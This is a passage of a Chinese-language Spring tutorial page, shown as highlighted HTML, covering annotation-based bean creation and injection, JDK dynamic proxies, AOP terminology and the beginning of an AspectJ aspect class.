class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">       https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--声明组件扫描器(component-scan),组件就是java对象</span></span><br><span class="line"><span class="comment">        base-package：指定注解在你的项目中的包名。</span></span><br><span class="line"><span class="comment">        component-scan工作方式： spring会扫描遍历base-package指定的包，</span></span><br><span class="line"><span class="comment">           把包中和子包中的所有类，找到类中的注解，按照注解的功能创建对象，或给属性赋值。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       加入了component-scan标签，配置文件的变化：</span></span><br><span class="line"><span class="comment">        1.加入一个新的约束文件spring-context.xsd</span></span><br><span class="line"><span class="comment">        2.给这个新的约束文件起个命名空间的名称</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.bjpowernode.ba02&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">     &lt;bean id=&quot;myXueXiao&quot; class=&quot;com.bjpowernode.ba03.School&quot;&gt;</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;name&quot; value=&quot;清华大学&quot; /&gt;</span></span><br><span class="line"><span class="comment">        &lt;property name=&quot;address&quot; value=&quot;北京&quot; /&gt;</span></span><br><span class="line"><span class="comment">    &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--加载属性配置文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:test.properties&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建Java类文件，在其中加入注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Component</span>: 创建对象的， 等同于&lt;bean&gt;的功能</span></span><br><span class="line"><span class="comment"> *     属性：value 就是对象的名称，也就是bean的id值，</span></span><br><span class="line"><span class="comment"> *          value的值是唯一的，创建的对象在整个spring容器中就一个</span></span><br><span class="line"><span class="comment"> *     位置：在类的上面</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@Component</span>(value = &quot;myStudent&quot;)等同于</span></span><br><span class="line"><span class="comment"> *   &lt;bean id=&quot;myStudent&quot; class=&quot;com.bjpowernode.ba01.Student&quot; /&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  spring中和<span class="doctag">@Component</span>功能一致，创建对象的注解还有：</span></span><br><span class="line"><span class="comment"> *  1.<span class="doctag">@Repository</span>（用在持久层类的上面） : 放在dao的实现类上面，</span></span><br><span class="line"><span class="comment"> *               表示创建dao对象，dao对象是能访问数据库的。</span></span><br><span class="line"><span class="comment"> *  2.<span class="doctag">@Service</span>(用在业务层类的上面)：放在service的实现类上面，</span></span><br><span class="line"><span class="comment"> *              创建service对象，service对象是做业务处理，可以有事务等功能的。</span></span><br><span class="line"><span class="comment"> *  3.<span class="doctag">@Controller</span>(用在控制器的上面)：放在控制器（处理器）类的上面，创建控制器对象的，</span></span><br><span class="line"><span class="comment"> *              控制器对象，能够接受用户提交的参数，显示请求的处理结果。</span></span><br><span class="line"><span class="comment"> *  以上三个注解的使用语法和<span class="doctag">@Component</span>一样的。 都能创建对象，但是这三个注解还有额外的功能。</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@Repository</span>，<span class="doctag">@Service</span>，<span class="doctag">@Controller</span>是给项目的对象分层的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//使用value属性，指定对象名称</span></span><br><span class="line"><span class="comment">//@Component(value = &quot;myStudent&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//省略value</span></span><br><span class="line"><span class="meta">@Component(&quot;myStudent&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不指定对象名称，由spring提供默认名称: 类名的首字母小写</span></span><br><span class="line"><span class="comment">//@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Value</span>: 简单类型的属性赋值</span></span><br><span class="line"><span class="comment">     *   属性： value 是String类型的，表示简单类型的属性值</span></span><br><span class="line"><span class="comment">     *   位置： 1.在属性定义的上面，无需set方法，推荐使用。</span></span><br><span class="line"><span class="comment">     *         2.在set方法的上面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//@Value(&quot;李四&quot; )</span></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;myname&#125;&quot;)</span> <span class="comment">//使用属性配置文件中的数据</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;myage&#125;&quot;)</span>  <span class="comment">//使用属性配置文件中的数据</span></span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 引用类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Autowired</span>: spring框架提供的注解，实现引用类型的赋值。</span></span><br><span class="line"><span class="comment">     *  属性：required ，是一个boolean类型的，默认true</span></span><br><span class="line"><span class="comment">     *       required=true：表示引用类型赋值失败，程序报错，并终止执行。</span></span><br><span class="line"><span class="comment">     *       required=false：引用类型如果赋值失败， 程序正常执行，引用类型是null</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * spring中通过注解给引用类型赋值，使用的是自动注入原理 ，支持byName, byType</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Autowired</span>:默认使用的是byType自动注入。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  位置：1）在属性定义的上面，无需set方法， 推荐使用</span></span><br><span class="line"><span class="comment">     *       2）在set方法的上面</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *  如果要使用byName方式，需要做的是：</span></span><br><span class="line"><span class="comment">     *  1.在属性上面加入<span class="doctag">@Autowired</span></span></span><br><span class="line"><span class="comment">     *  2.在属性上面加入<span class="doctag">@Qualifier</span>(value=&quot;bean的id&quot;) ：表示使用指定名称的bean完成赋值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> School school;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//byName自动注入</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;mySchool&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> School school;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 引用类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Resource</span>: 来自jdk中的注解，spring框架提供了对这个注解的功能支持，可以使用它给引用类型赋值</span></span><br><span class="line"><span class="comment">     *            使用的也是自动注入原理，支持byName， byType .默认是byName</span></span><br><span class="line"><span class="comment">     *  位置： 1.在属性定义的上面，无需set方法，推荐使用。</span></span><br><span class="line"><span class="comment">     *        2.在set方法的上面</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 默认是byName： 先使用byName自动注入，如果byName赋值失败，再使用byType</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Resource</span>只使用byName方式，需要增加一个属性 name</span></span><br><span class="line"><span class="comment">     * name的值是bean的id（名称）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> School school;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==student无参数构造方法===&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Value(&quot;30&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>属性配置文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">myname</span>=<span class="string">\u5F20\u4E09\u975E</span></span><br><span class="line"><span class="attr">myage</span>=<span class="string">20</span></span><br></pre></td></tr></table></figure><h2 id="AOP面向切面"><a href="#AOP面向切面" class="headerlink" title="AOP面向切面"></a>AOP面向切面</h2><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>  实现方式：<br>jdk动态代理，使用jdk中的Proxy，Method，InvocaitonHanderl创建代理对象。<br>jdk动态代理要求目标类必须实现接口</p><p>  cglib动态代理：第三方的工具库，创建代理对象，原理是继承。 通过继承目标类，创建子类。<br>             子类就是代理对象。 要求目标类不能是final的， 方法也不能是final的</p><p>动态代理的作用：<br>   1）在目标类源代码不改变的情况下，增加功能。<br>    2）减少代码的重复<br>    3）专注业务逻辑代码<br>    4）解耦合，让你的业务功能和日志，事务非业务功能分离。</p><p>切面代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyIncationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">//目标对象</span></span><br><span class="line">    <span class="keyword">private</span> Object target; <span class="comment">//SomeServiceImpl类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyIncationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//通过代理对象执行方法时，会调用执行这个invoke（）</span></span><br><span class="line">        System.out.println(<span class="string">&quot;执行MyIncationHandler中的invoke()&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;method名称：&quot;</span>+method.getName());</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">res</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;doSome&quot;</span>.equals(methodName))&#123; <span class="comment">//JoinPoint  Pointcut</span></span><br><span class="line">            ServiceTools.doLog(); <span class="comment">//在目标方法之前，输出时间</span></span><br><span class="line">            <span class="comment">//执行目标类的方法，通过Method类实现</span></span><br><span class="line">            res  = method.invoke(target,args); <span class="comment">//SomeServiceImpl.doSome()</span></span><br><span class="line">            ServiceTools.doTrans(); <span class="comment">//在目标方法执行之后，提交事务</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res  = method.invoke(target,args); <span class="comment">//SomeServiceImpl.doOther()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//目标方法的执行结果</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动态代理代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用jdk的Proxy创建代理对象</span></span><br><span class="line"><span class="comment">//创建目标对象</span></span><br><span class="line"><span class="type">SomeService</span> <span class="variable">target</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SomeServiceImpl</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建InvocationHandler对象</span></span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyIncationHandler</span>(target);</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Proxy创建代理</span></span><br><span class="line"><span class="type">SomeService</span> <span class="variable">proxy</span> <span class="operator">=</span> (SomeService) Proxy.newProxyInstance(</span><br><span class="line">        target.getClass().getClassLoader(),</span><br><span class="line">        target.getClass().getInterfaces(),handler);</span><br><span class="line"><span class="comment">//com.sun.proxy.$Proxy0</span></span><br><span class="line">System.out.println(<span class="string">&quot;proxy======&quot;</span>+proxy.getClass().getName());</span><br><span class="line"><span class="comment">//通过代理执行方法，会调用handler中的invoke（）</span></span><br><span class="line">proxy.doSome();</span><br><span class="line">System.out.println(<span class="string">&quot;==================================================&quot;</span>);</span><br><span class="line">proxy.doOther();</span><br></pre></td></tr></table></figure><h3 id="如何理解AOP"><a href="#如何理解AOP" class="headerlink" title="如何理解AOP"></a>如何理解AOP</h3><p>Aop（Aspect Orient Programming）:面向切面编程， 基于动态代理的，可以使用jdk，cglib两种代理方式。<br>  Aop就是动态代理的规范化， 把动态代理的实现步骤，方式都定义好了， 让开发人员用一种统一的方式，使用动态代理。</p><p>  Aspect: 切面，给你的目标类增加的功能，就是切面。 像上面用的日志，事务都是切面。切面的特点： 一般都是非业务方法，独立使用的。<br>  Orient：面向， 对着。<br>  Programming：编程</p><p>  怎么理解面向切面编程 ？<br>   1）需要在分析项目功能时，找出切面。<br>    2）合理的安排切面的执行时间（在目标方法前， 还是目标方法后）<br>    3）合理的安全切面执行的位置，在哪个类，哪个方法增加增强功能</p><p>  术语：<br>   1）Aspect:切面，表示增强的功能， 就是一堆代码，完成某个一个功能。非业务功能，<br>              常见的切面功能有日志， 事务， 统计信息， 参数检查， 权限验证。</p><p>   2）JoinPoint:连接点 ，连接业务方法和切面的位置。 就某类中的业务方法<br>    3）Pointcut : 切入点 ，指多个连接点方法的集合。多个方法<br>    4）目标对象： 给哪个类的方法增加功能， 这个类就是目标对象<br>    5）Advice:通知，通知表示切面功能执行的时间。</p><pre><code>说一个切面有三个关键的要素：1）切面的功能代码，切面干什么2）切面的执行位置，使用Pointcut表示切面执行的位置3）切面的执行时间，使用Advice表示时间，在目标方法之前，还是目标方法之后。</code></pre><h3 id="AOP的实现"><a href="#AOP的实现" class="headerlink" title="AOP的实现"></a>AOP的实现</h3><p>   aop是一个规范，是动态的一个规范化，一个标准<br>    aop的技术实现框架：<br>    1.spring：spring在内部实现了aop规范，能做aop的工作。<br>              spring主要在事务处理时使用aop。<br>                 我们项目开发中很少使用spring的aop实现。 因为spring的aop比较笨重。</p><p>   2.aspectJ: 一个开源的专门做aop的框架。spring框架中集成了aspectj框架，通过spring就能使用aspectj的功能。<br>      aspectJ框架实现aop有两种方式：<br>       1.使用xml的配置文件 ： 配置全局事务<br>        2.使用注解，我们在项目中要做aop功能，一般都使用注解， aspectj有5个注解。</p><p>学习aspectj框架的使用：</p><ol><li><p>切面的执行时间， 这个执行时间在规范中叫做Advice(通知，增强)<br> 在aspectj框架中使用注解表示的。也可以使用xml配置文件中的标签</p><ol><li>@Before</li><li>@AfterReturning</li><li>@Around</li><li>@AfterThrowing</li><li>@After</li></ol></li><li><p>表示切面执行的位置，使用的是切入点表达式。<br>execution(访问权限(可省略) 方法返回值 方法声明(参数) 异常类型(可省略))<br>execution(* <em>..service.</em>.*(..))<br><img src="/upload/2022/03/image-f31efef2e1a8460da50e98a4180fa5a2.png" alt="image.png"></p></li></ol><p><strong>加aspectj依赖</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--aspectj依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>创建切面类：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@Aspect</span> : 是aspectj框架中的注解。</span></span><br><span class="line"><span class="comment"> *     作用：表示当前类是切面类。</span></span><br><span class="line"><span class="comment"> *     切面类：是用来给业务方法增加功能的类，在这个类中有切面的功能代码</span></span><br><span class="line"><span class="comment"> *     位置：在类定义的上面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyAspect</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义方法，方法是实现切面功能的。</span></span><br><span class="line"><span class="comment">     * 方法的定义要求：</span></span><br><span class="line"><span class="comment">     * 1.公共方法 public</span></span><br><span class="line"><span class="comment">     * 2.方法没有返回值</span></span><br><span class="line"><span class="comment">     * 3.方法名称自定义</span></span><br><span class="line"><span class="comment">     * 4.方法可以有参数，也可以没有参数。</span></span><br><span class="line"><span class="comment">     *   如果有参数，参数不是自定义的，有几个参数类型可以使用。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Before</span>: 前置通知注解</span></span><br><span class="line"><span class="comment">     *   属性：value ，是切入点表达式，表示切面的功能执行的位置。</span></span><br><span class="line"><span class="comment">     *   位置：在方法的上面</span></span><br><span class="line"><span class="comment">     * 特点：</span></span><br><span class="line"><span class="comment">     *  1.在目标方法之前先执行的</span></span><br><span class="line"><span class="comment">     *  2.不会改变目标方法的执行结果</span></span><br><span class="line"><span class="comment">     *  3.不会影响目标方法的执行。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">   <span class="comment">/* @Before(value = &quot;execution(public void 